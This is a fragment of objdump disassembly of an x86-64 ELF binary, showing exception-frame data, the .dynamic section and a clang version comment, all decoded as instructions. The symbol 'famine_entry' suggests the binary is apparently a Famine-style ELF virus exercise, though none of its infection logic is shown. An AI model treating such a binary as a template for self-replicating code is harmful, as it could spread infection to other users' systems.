    4844:	54                   	push   %rsp
    4845:	06                   	(bad)  
    4846:	00 00                	add    %al,(%rax)
    4848:	d8 e9                	fsubr  %st(1),%st
    484a:	ff                   	(bad)  
    484b:	ff                   	(bad)  
    484c:	ec                   	in     (%dx),%al
    484d:	00 00                	add    %al,(%rax)
    484f:	00 00                	add    %al,(%rax)
    4851:	41 0e                	rex.B (bad) 
    4853:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4859:	02 e7                	add    %bh,%ah
    485b:	0c 07                	or     $0x7,%al
    485d:	08 00                	or     %al,(%rax)
    485f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4862:	00 00                	add    %al,(%rax)
    4864:	74 06                	je     486c <__GNU_EH_FRAME_HDR+0x860>
    4866:	00 00                	add    %al,(%rax)
    4868:	a8 ea                	test   $0xea,%al
    486a:	ff                   	(bad)  
    486b:	ff ab 00 00 00 00    	ljmp   *0x0(%rbx)
    4871:	41 0e                	rex.B (bad) 
    4873:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4879:	02 a6 0c 07 08 00    	add    0x8070c(%rsi),%ah
    487f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4882:	00 00                	add    %al,(%rax)
    4884:	94                   	xchg   %eax,%esp
    4885:	06                   	(bad)  
    4886:	00 00                	add    %al,(%rax)
    4888:	38 eb                	cmp    %ch,%bl
    488a:	ff                   	(bad)  
    488b:	ff c6                	inc    %esi
    488d:	00 00                	add    %al,(%rax)
    488f:	00 00                	add    %al,(%rax)
    4891:	41 0e                	rex.B (bad) 
    4893:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4899:	02 c1                	add    %cl,%al
    489b:	0c 07                	or     $0x7,%al
    489d:	08 00                	or     %al,(%rax)
    489f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    48a2:	00 00                	add    %al,(%rax)
    48a4:	b4 06                	mov    $0x6,%ah
    48a6:	00 00                	add    %al,(%rax)
    48a8:	e8 eb ff ff 4f       	callq  50004898 <__bss_start+0x4fffe898>
    48ad:	01 00                	add    %eax,(%rax)
    48af:	00 00                	add    %al,(%rax)
    48b1:	41 0e                	rex.B (bad) 
    48b3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    48b9:	03 4a 01             	add    0x1(%rdx),%ecx
    48bc:	0c 07                	or     $0x7,%al
    48be:	08 00                	or     %al,(%rax)
    48c0:	1c 00                	sbb    $0x0,%al
    48c2:	00 00                	add    %al,(%rax)
    48c4:	d4                   	(bad)  
    48c5:	06                   	(bad)  
    48c6:	00 00                	add    %al,(%rax)
    48c8:	18 ed                	sbb    %ch,%ch
    48ca:	ff                   	(bad)  
    48cb:	ff c8                	dec    %eax
    48cd:	00 00                	add    %al,(%rax)
    48cf:	00 00                	add    %al,(%rax)
    48d1:	41 0e                	rex.B (bad) 
    48d3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    48d9:	02 c3                	add    %bl,%al
    48db:	0c 07                	or     $0x7,%al
    48dd:	08 00                	or     %al,(%rax)
    48df:	00 1c 00             	add    %bl,(%rax,%rax,1)
    48e2:	00 00                	add    %al,(%rax)
    48e4:	f4                   	hlt    
    48e5:	06                   	(bad)  
    48e6:	00 00                	add    %al,(%rax)
    48e8:	c8 ed ff ff          	enterq $0xffed,$0xff
    48ec:	23 00                	and    (%rax),%eax
    48ee:	00 00                	add    %al,(%rax)
    48f0:	00 41 0e             	add    %al,0xe(%rcx)
    48f3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    48f9:	5e                   	pop    %rsi
    48fa:	0c 07                	or     $0x7,%al
    48fc:	08 00                	or     %al,(%rax)
    48fe:	00 00                	add    %al,(%rax)
    4900:	1c 00                	sbb    $0x0,%al
    4902:	00 00                	add    %al,(%rax)
    4904:	14 07                	adc    $0x7,%al
    4906:	00 00                	add    %al,(%rax)
    4908:	d8 ed                	fsubr  %st(5),%st
    490a:	ff                   	(bad)  
    490b:	ff                   	(bad)  
    490c:	b9 00 00 00 00       	mov    $0x0,%ecx
    4911:	41 0e                	rex.B (bad) 
    4913:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4919:	02 b4 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%dh
    4920:	18 00                	sbb    %al,(%rax)
    4922:	00 00                	add    %al,(%rax)
    4924:	34 07                	xor    $0x7,%al
    4926:	00 00                	add    %al,(%rax)
    4928:	78 ee                	js     4918 <__GNU_EH_FRAME_HDR+0x90c>
    492a:	ff                   	(bad)  
    492b:	ff 23                	jmpq   *(%rbx)
    492d:	00 00                	add    %al,(%rax)
    492f:	00 00                	add    %al,(%rax)
    4931:	41 0e                	rex.B (bad) 
    4933:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4939:	00 00                	add    %al,(%rax)
	...

Disassembly of section .dynamic:

0000000000005f20 <_DYNAMIC>:
    5f20:	04 00                	add    $0x0,%al
    5f22:	00 00                	add    %al,(%rax)
    5f24:	00 00                	add    %al,(%rax)
    5f26:	00 00                	add    %al,(%rax)
    5f28:	90                   	nop
    5f29:	02 00                	add    (%rax),%al
    5f2b:	00 00                	add    %al,(%rax)
    5f2d:	00 00                	add    %al,(%rax)
    5f2f:	00 f5                	add    %dh,%ch
    5f31:	fe                   	(bad)  
    5f32:	ff 6f 00             	ljmp   *0x0(%rdi)
    5f35:	00 00                	add    %al,(%rax)
    5f37:	00 a0 02 00 00 00    	add    %ah,0x2(%rax)
    5f3d:	00 00                	add    %al,(%rax)
    5f3f:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 5f45 <_DYNAMIC+0x25>
    5f45:	00 00                	add    %al,(%rax)
    5f47:	00 d8                	add    %bl,%al
    5f49:	02 00                	add    (%rax),%al
    5f4b:	00 00                	add    %al,(%rax)
    5f4d:	00 00                	add    %al,(%rax)
    5f4f:	00 06                	add    %al,(%rsi)
    5f51:	00 00                	add    %al,(%rax)
    5f53:	00 00                	add    %al,(%rax)
    5f55:	00 00                	add    %al,(%rax)
    5f57:	00 c0                	add    %al,%al
    5f59:	02 00                	add    (%rax),%al
    5f5b:	00 00                	add    %al,(%rax)
    5f5d:	00 00                	add    %al,(%rax)
    5f5f:	00 0a                	add    %cl,(%rdx)
    5f61:	00 00                	add    %al,(%rax)
    5f63:	00 00                	add    %al,(%rax)
    5f65:	00 00                	add    %al,(%rax)
    5f67:	00 01                	add    %al,(%rcx)
    5f69:	00 00                	add    %al,(%rax)
    5f6b:	00 00                	add    %al,(%rax)
    5f6d:	00 00                	add    %al,(%rax)
    5f6f:	00 0b                	add    %cl,(%rbx)
    5f71:	00 00                	add    %al,(%rax)
    5f73:	00 00                	add    %al,(%rax)
    5f75:	00 00                	add    %al,(%rax)
    5f77:	00 18                	add    %bl,(%rax)
    5f79:	00 00                	add    %al,(%rax)
    5f7b:	00 00                	add    %al,(%rax)
    5f7d:	00 00                	add    %al,(%rax)
    5f7f:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 5f85 <_DYNAMIC+0x65>
	...
    5f8d:	00 00                	add    %al,(%rax)
    5f8f:	00 fb                	add    %bh,%bl
    5f91:	ff                   	(bad)  
    5f92:	ff 6f 00             	ljmp   *0x0(%rdi)
    5f95:	00 00                	add    %al,(%rax)
    5f97:	00 00                	add    %al,(%rax)
    5f99:	00 00                	add    %al,(%rax)
    5f9b:	08 00                	or     %al,(%rax)
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	63 6c 61 6e          	movslq 0x6e(%rcx,%riz,2),%ebp
   4:	67 20 76 65          	and    %dh,0x65(%esi)
   8:	72 73                	jb     7d <famine_entry-0xf83>
   a:	69 6f 6e 20 39 2e 30 	imul   $0x302e3920,0x6e(%rdi),%ebp
  11:	2e 30 20             	xor    %ah,%cs:(%rax)
  14:	28 74 61 67          	sub    %dh,0x67(%rcx,%riz,2)
  18:	73 2f                	jae    49 <famine_entry-0xfb7>
  1a:	52                   	push   %rdx
  1b:	45                   	rex.RB
  1c:	4c                   	rex.WR
  1d:	45                   	rex.RB
  1e:	41 53                	push   %r11
  20:	45 5f                	rex.RB pop %r15
  22:	39 30                	cmp    %esi,(%rax)
  24:	30 2f                	xor    %ch,(%rdi)
  26:	66 69 6e 61 6c 29    	imul   $0x296c,0x61(%rsi),%bp
	...
